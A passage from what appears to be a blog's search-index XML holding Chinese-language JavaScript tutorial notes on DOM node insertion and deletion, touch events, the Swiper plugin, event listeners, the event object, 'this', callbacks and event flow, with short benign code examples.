节点</li><li><code>cloneNode</code> 复制现有的 DOM 节点，传入参数 true 会复制所有子节点</li><li><code>appendChild</code> 在末尾（结束标签前）插入节点</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>插入节点<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>在现有 dom 结构基础上插入新的元素节点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn1&quot;</span>&gt;</span>在任意节点前插入<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>CSS<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 点击按钮，在已有 DOM 中插入新节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn1&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">btn1.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 第 2 个 li 元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> relative = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;li:nth-child(2)&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 动态创建新的节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> li1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">li1.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span></span><br><span class="line"><span class="language-javascript">li1.<span class="property">innerText</span> = <span class="string">&#x27;Web APIs&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 复制现有的节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> li2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;li:first-child&#x27;</span>).<span class="title function_">cloneNode</span>(<span class="literal">true</span>)</span></span><br><span class="line"><span class="language-javascript">li2.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;blue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 在 relative 节点前插入</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>).<span class="title function_">insertBefore</span>(li1, relative)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>).<span class="title function_">insertBefore</span>(li2, relative)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：</p><ul><li><code>createElement</code> 动态创建任意 DOM 节点</li><li><code>cloneNode</code> 复制现有的 DOM 节点，传入参数 true 会复制所有子节点</li><li><code>insertBefore</code> 在父节点中任意子节点之前插入新节点</li></ul><h2 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h2><p>删除现有的 DOM 节点，也需要关注两个因素：</p><ul><li>首先由父节点删除子节点</li><li>其次是要删除哪个子节点。</li><li><code>父元素.removeChild(要删除的元素)</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 点击按钮删除节点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>删除节点<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>CSS<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Web APIs<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取 ul 父节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 待删除的子节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> lis = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 删除节点</span></span></span><br><span class="line"><span class="language-javascript">ul.<span class="title function_">removeChild</span>(lis[<span class="number">0</span>])</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：<code>removeChild</code> 删除节点时一定是由父子关系。</p><h1 id="移动端事件"><a href="#移动端事件" class="headerlink" title="移动端事件"></a>移动端事件</h1><p>触屏事件 <code>touch</code>（也称为触摸事件），Android 和 iOS 都有，关于<a href="https://m78alien.github.io/2024/01/25/Web%E7%A7%BB%E5%8A%A8%E9%80%82%E9%85%8D/">移动端适配的内容</a></p><p>touch对象代表一个触摸点，触摸点可能是一根手指，也可能是一根触控笔。</p><p>触屏事件可响应用户手指（或触屏笔）对屏幕或触控板操作</p><table><thead><tr><th>触屏touch事件</th><th>说明</th></tr></thead><tbody><tr><td>touchstart</td><td>手指触摸到一个DOM元素时触发</td></tr><tr><td>touchmove</td><td>手指在一个DOM元素上滑动时触发</td></tr><tr><td>touchend</td><td>手指从一个DOM元素上移开时触发</td></tr></tbody></table><h2 id="触摸滑动插件"><a href="#触摸滑动插件" class="headerlink" title="触摸滑动插件"></a>触摸滑动插件</h2><p>针对移动端适配的<strong>触摸滑动插件</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240202161021.png" alt="image.png"></p><ul><li>插件官网： <a href="https://www.swiper.com.cn/">https://www.swiper.com.cn/</a> </li><li>demo： <a href="https://www.swiper.com.cn/demo/index.html">https://www.swiper.com.cn/demo/index.html</a> </li><li>基本使用流程： <a href="https://www.swiper.com.cn/usage/index.html">https://www.swiper.com.cn/usage/index.html</a> </li><li>查看APi文档： <a href="https://www.swiper.com.cn/api/index.html">https://www.swiper.com.cn/api/index.html</a> </li><li>插件下载： <a href="https://www.swiper.com.cn/download/index.html">https://www.swiper.com.cn/download/index.html</a></li><li>注意：多个swiper同时使用的时候, 类名需要注意区分</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> WebAPIs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-DOM事件</title>
      <link href="/2024/01/31/JavaScript-DOM%E4%BA%8B%E4%BB%B6/"/>
      <url>/2024/01/31/JavaScript-DOM%E4%BA%8B%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h1><p>结合 DOM 使用事件时，需要为 DOM 对象添加<strong>事件监听</strong>，等待事件发生（触发）时，便立即调用一个函数。</p><p><code>元素对象.addEventListener(&#39;事件类型&#39;, 要执行的函数)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>事件监听<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span>&gt;</span>为 DOM 元素添加事件监听，等待事件发生，便立即执行一个函数。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>点击改变文字颜色<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 获取 button 对应的 DOM 对象</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#btn&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 添加事件监听</span></span></span><br><span class="line"><span class="language-javascript">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;等待事件被触发...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 改变 p 标签的文字颜色</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> text = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;text&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">text.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. 只要用户点击了按钮，事件便触发了！！！</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完成事件监听分成3个步骤：</p><ol><li>获取 DOM 元素</li><li>通过 <code>addEventListener</code> 方法为 DOM 节点添加事件监听</li><li>等待事件触发，如用户点击了某个按钮时便会触发 <code>click</code> 事件类型</li><li>事件触发后，相对应的回调函数会被执行</li></ol><p>事件监听三要素：</p><ol><li><strong>事件源</strong>：哪个DOM元素被事件触发，要获取DOM元素</li><li><strong>事件类型</strong>：用什么方式触发，比如鼠标单击<code>click</code>、鼠标经过<code>mouseover</code>等</li><li><strong>事件调用的函数</strong>：要做什么</li></ol><h1 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h1><p><strong>鼠标事件</strong>：</p><ol><li><code>click</code>：鼠标点击</li><li><code>mouseenter</code>：鼠标经过</li><li><code>mouseleave</code>：鼠标离开</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>鼠标事件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>监听与鼠标相关的操作<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 需要事件监听的 DOM 元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 监听鼠标是移入当前 DOM 元素</span></span></span><br><span class="line"><span class="language-javascript">box.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 修改文本内容</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">innerText</span> = <span class="string">&#x27;鼠标移入了...&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 修改光标的风格</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">cursor</span> = <span class="string">&#x27;move&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 监听鼠标是移出当前 DOM 元素</span></span></span><br><span class="line"><span class="language-javascript">box.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 修改文本内容</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">innerText</span> = <span class="string">&#x27;鼠标移出了...&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>焦点事件</strong>：</p><ol><li><code>focus</code>：获得焦点</li><li><code>blur</code>：失去焦点</li></ol><p><strong>键盘事件</strong>：</p><ol><li><code>Keydown</code>：键盘按下触发</li><li><code>Keyup</code>：键盘抬起触发</li></ol><p><strong>文本事件</strong>：</p><ol><li><code>input</code>：用户输入事件</li></ol><h1 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h1><p>任意事件类型被触发时与事件相关的信息会被以对象的形式记录下来，我们称这个对象为<strong>事件对象</strong>。</p><p><code>元素.addEventListener(&#39;click&#39;, function(e)&#123; &#125;)  // e就是事件对象</code></p><p>事件回调函数的<strong>第1个参数</strong>即所谓的事件对象，通常习惯性的将这个对数命名为 <code>event</code>、<code>ev</code> 、<code>e</code> 。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>事件对象<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>任意事件类型被触发时与事件相关的信息会被以对象的形式记录下来，我们称这个对象为事件对象。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取 .box 元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 添加事件监听</span></span></span><br><span class="line"><span class="language-javascript">box.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;任意事件类型被触发后，相关信息会以对象形式被记录下来...&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 事件回调函数的第1个参数即所谓的事件对象</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来简单看一下事件对象中包含了哪些有用的信息：</p><ol><li><code>ev.type</code>：当前事件的类型</li><li><code>ev.clientX/Y</code>：光标相对浏览器窗口左上角的位置</li><li><code>ev.offsetX/Y</code>：光标相于当前 DOM 元素左上角的位置</li><li><code>key</code>：用户按下的键盘值</li></ol><p>注：在事件回调函数内部通过 <code>window.event</code> 同样可以获取事件对象。</p><h1 id="环境对象"><a href="#环境对象" class="headerlink" title="环境对象"></a>环境对象</h1><p><strong>环境对象</strong>指的是函数内部特殊的变量 <code>this</code> ，它代表着当前函数运行时所处的环境。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 声明函数</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// this 是一个变量</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 声明一个对象</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> user = &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">sayHi</span>: sayHi <span class="comment">// 此处把 sayHi 函数，赋值给 sayHi 属性</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> person = &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">sayHi</span>: sayHi</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 直接调用</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">sayHi</span>() <span class="comment">// window</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">sayHi</span>() <span class="comment">// window</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 做为对象方法调用</span></span></span><br><span class="line"><span class="language-javascript">user.<span class="title function_">sayHi</span>() <span class="comment">// user</span></span></span><br><span class="line"><span class="language-javascript">person.<span class="title function_">sayHi</span>() <span class="comment">// person</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：</p><ol><li><code>this</code> 本质上是一个变量，数据类型为对象</li><li>函数的调用方式不同 <code>this</code> 变量的值也不同</li><li>【谁调用 <code>this</code> 就是谁】是判断 <code>this</code> 值的粗略规则</li><li>函数直接调用时实际上 <code>window.sayHi()</code> 所以 <code>this</code> 的值为 <code>window</code></li></ol><h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><p>如果将函数 A 做为参数传递给函数 B 时，我们称函数 A 为<strong>回调函数</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 声明 foo 函数</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 普通的值做为参数</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">foo</span>(<span class="number">10</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">foo</span>(<span class="string">&#x27;hello world!&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">foo</span>([<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;函数也能当参数...&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 函数也可以做为参数！！！！</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">foo</span>(bar);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数 <code>bar</code> 做参数传给了 <code>foo</code> 函数，<code>bar</code> 就是所谓的回调函数了！！！</p><p>我们回顾一下间歇函数 <code>setInterval</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是回调函数...&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 调用定时器</span></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setInterval</span>(fn, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>fn</code> 函数做为参数传给了 <code>setInterval</code> ，这便是回调函数的实际应用了，结合刚刚学习的函数表达式上述代码还有另一种更常见写法。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 调用定时器，匿名函数做为参数</span></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是回调函数...&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：</p><ol><li>回调函数本质还是函数，只不过把它当成参数使用</li><li>使用匿名函数作为回调函数比较常见</li></ol><h1 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h1><p><strong>事件流</strong>指的是事件完整执行过程中的流动路径</p><p>了解事件的执行过程有助于加深对事件的理解，提升开发实践中对事件运用的灵活度。</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/event.png" alt="event.png"></p><p>如上图所示，任意事件被触发时总会经历两个阶段：<strong>捕获阶段</strong>和<strong>冒泡阶段</strong>。</p><p>简单的说，捕获阶段是<strong>从父到子</strong>的传导过程，冒泡阶段是<strong>从子向父</strong>的传导过程。</p><p>实际工作都是使用事件冒泡为主</p><h2 id="事件捕获和冒泡"><a href="#事件捕获和冒泡" class="headerlink" title="事件捕获和冒泡"></a>事件捕获和冒泡</h2><p>从DOM的根元素开始执行对应的事件（从外到里）</p><p><code>DOM.addEventListener(事件类型, 事件处理函数, 是否使用捕获机制)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 